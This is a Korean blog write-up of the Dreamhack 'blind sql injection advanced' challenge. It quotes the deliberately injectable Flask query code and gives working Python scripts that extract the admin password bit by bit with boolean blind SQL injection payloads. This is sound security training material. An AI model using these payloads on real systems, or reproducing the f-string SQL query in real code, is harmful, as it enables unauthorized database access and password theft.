---
layout: post
title: Dreamhack | blind sql injection advanced
subtitle: Dreamhack Blind SQLi advanced
categories: dreamhack.io
tags: [Pentest, Web]
---
 
**본 문제는 Dreamhack을 통해서 풀어 보실 수 있습니다.**

**해답을 이해하며 생각을 해보면서 풀이 해보시길 바랍니다.**

## 문제 내용

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/219560426-7a14a698-5f1e-41ae-8e29-cec58fbad067.png" width = 500> 
</p>

해당 문제는 SQL 심화 과정에 대한 문제입니다. **Blind SQLi**문제로 심화된 과정입니다. 관리자의 비밀번호는 **아스키코드, 한글**로 이루어져 있다보니 인코딩에 유의해서 해결해야합니다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/217181793-19911960-90f0-420b-9032-93816300092a.png" width = 500> 
</p>

**EditText**를 통해서 입력되는 값이 아래의 쿼리로 진행되는 것을 문제에서 알려줍니다.

```sql
SELECT * FROM user WHERE uid='{uid}';
```

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/219560913-0f7f2f68-d479-418a-8981-0b386c5ada9c.png" width = 500> 
</p>

입력했던 값이 GET 메소드를 이용해 `uid` 변수에 들어가고 입력 값에 따라 쿼리도 변하는 것을 알 수 있습니다. 기존 DB에 **guest**라는 계정이 존재하면 아래처럼 `user "guest" exists`라는 문구가 나오는 것을 알 수 있습니다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/219560819-c1438709-7d1c-48fa-91e6-804435e274f7.png" width = 500> 
</p>

이번에는 `hey`라는 값을 넣었을 때의 반응입니다. 이 계정은 존재하지 않기에 아무런 값이 나오지 않은 것으로 보입니다.

## 문제 풀이

제공되는 파일에는 `init.sql, app.py` 두 가지가 있기에 분석 해보겠습니다.

### init.sql

```sql
CREATE DATABASE user_db CHARACTER SET utf8;
GRANT ALL PRIVILEGES ON user_db.* TO 'dbuser'@'localhost' IDENTIFIED BY 'dbpass';

USE `user_db`;
CREATE TABLE users (
  idx int auto_increment primary key,
  uid varchar(128) not null,
  upw varchar(128) not null
);

INSERT INTO users (uid, upw) values ('admin', 'DH{**FLAG**}');
INSERT INTO users (uid, upw) values ('guest', 'guest');
INSERT INTO users (uid, upw) values ('test', 'test');
FLUSH PRIVILEGES;
```

`users`라는 DB가 존재하지 않으면 `users`로 DB를 만들며 `users` DB를 사용하고, `user` 테이블에 `uid, upw` 계졍의 정보가 담겨 있습니다.

|ID|PW|
|:--:|:--:|
|admin|**FLAG**|
|guest|guest|
|test|test|

DB를 생성할 때에 `utf8`의 인코딩을 사용하도록 명시했기에 한글이 포함된 값이 있을 수 있다.

### app.py

```python
template ='''
<pre style="font-size:200%">SELECT * FROM users WHERE uid='{{uid}}';</pre><hr/>
<form>
    <input tyupe='text' name='uid' placeholder='uid'>
    <input type='submit' value='submit'>
</form>
{% if nrows == 1%}
    <pre style="font-size:150%">user "{{uid}}" exists.</pre>
{% endif %}
'''

@app.route('/', methods=['GET'])
def index():
    uid = request.args.get('uid', '')
    nrows = 0

    if uid:
        cur = mysql.connection.cursor()
        nrows = cur.execute(f"SELECT * FROM users WHERE uid='{uid}';")

    return render_template_string(template, uid=uid, nrows=nrows)
```

**GET** 메소드를 이용하고 `uid` 변수를 통해서 값을 받으면 쿼리를 진행하는데 해당 쿼리의 값이 `1`일 경우 `<pre style="font-size:150%">user "{{uid}}" exists.</pre>`를 보여주게 된다.

계정이 존재할 때와 존재하지 않을 때의 결과 값이 다르므로 **Blind SQLi**로 접근하게 됩니다.

```sql
' or 1=1 limit 0, 1 ;--
```

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/219562738-7611bdd1-195c-4dc2-9dbc-a8d91b8d1a44.png" width = 450> 
</p>

`limit 0, 1`이 없다면 존재하는 값이 많아지기에 출력하지 않게 된다. 따라서, 해당 폼을 보여주는 로직인 `nrow == 1`을 만족시키기 위해 사용했고 그 결과로 입력했던 값이 존재한다는 것을 보여주게 된다.

### Password Length

```python
url = 'http://host3.dreamhack.games:10934/'
pw_length = 0

for i in tqdm(range(100)):
    payload = f'admin\' and char_length(upw) = {i}; -- '
    param = {'uid' : payload}
    r = requests.get(url, params = param)
    
    if r.text.__contains__('exists'):
        pw_length = i
        break

print(f'[*] PASSWORD LENGTH = {pw_length}')  
```

비밀번호의 길이를 알기 위해서 `length`가 아닌 `char_length`를 사용하여 문자열 인코딩에 따른 정확한 길이를 계산한다.

두 함수를 사용해보면 길이가 다르게 나오는 것을 알 수 있다.

### Password

기존에 UTF-8 인코딩 방식이 아닌 비밀번호를 확인하는 방법으로는 아스키코드에 대한 범위를 지정하여 Brute Force 했습니다.

한글이 포함된 경우에는 범위가 너무 크다. 또한 실전에서는 한글인지 아스키코드인지 알 방법이 없기에 모든 가능성을 열어야 한다.

그렇기에 패스워드 한 글자의 **비트열 길이**를 알아야 하며, **비트열 추출**, **비트 변환** 이 세 과정을 거쳐야 한다.

#### Find Bitstream

```python
def bitstream(pw_len):
    for i in tqdm(range(1, pw_len + 1)):
        bit_length = 0
        while True:
            bit_length += 1
            payload = f'admin\' and length(bin(ord(substr(upw, {i}, 1)))) = {bit_length}; -- '
            param = {'uid' : payload}
            r = requests.get(url, params = param)
            
            if r.text.__contains__('exists'):
                break

        print(f'[*] {i}\'s BIT LENGTH = {bit_length}') 
```

패스워드 길이를 알았으므로 한 글자씩 뽑아 하나의 문자를 인자로 받고 해당 문자에 해당하는 유니코드 정수를 반환받고 비트를 변환하여 비트 길이를 추출한다.

만약, `a`라는 값이였다면 **97**의 값을 비트로 표현해 `1100001` 7글자가 나온다.

`ㄱ`의 경우는 **12619**의 값이 **11000101001011**의 비트 표현의 14글자,

`한`의 경우  **54620**의 값이 **1101010101011100**의 비트 표현 16글자가 나오게 된다.

```python
for j in range(1, bit_length + 1):    
    payloads = f'admin\' and substr(bin(ord(substr(upw, {i}, 1))), {j}, 1) = \'1\'; -- '
    param = {'uid' : payloads}
    r = requests.get(url, params = param)
    
    if r.text.__contains__('exists'):
        bit += '1'
    else:
        bit += '0'

print(f'BIT = {bit}')
```

앞서 했던 코드를 통해 한 글자에 대한 비트열의 길이를 알아내어 비트의 값을 확인할 수 있고, 이 점을 이용하여 한 글자씩 비트 값을 추출하면 비밀번호를 알 수 있다.

#### Covert Bit to Char

비밀번호의 각 글자별 비트열 길이, 비트 값을 알았으므로 해당 값에 대한 변환이 필요하다.

```python
password += int.to_bytes(int(bit, 2), (bit_length + 7) // 8, "big").decode("utf-8")
```

* **첫번째 인자** : 변환하고자 하는 값

* **두번째 인자** : 표현하고자 하는 값의 길이

* **세번째 인자** : Big, Little Endian

비트는 현재 문자열로 되어있으므로 **2진수로의 int 형변환**, 한글의 경우 2byte이기에 비트의 길이 값에 따른 **값 표현 길이**, 글자 표현의 경우는 **Big Endian**을 이용하여 UTF-8 인코딩을 진행하면 비밀번호를 알 수 있습니다.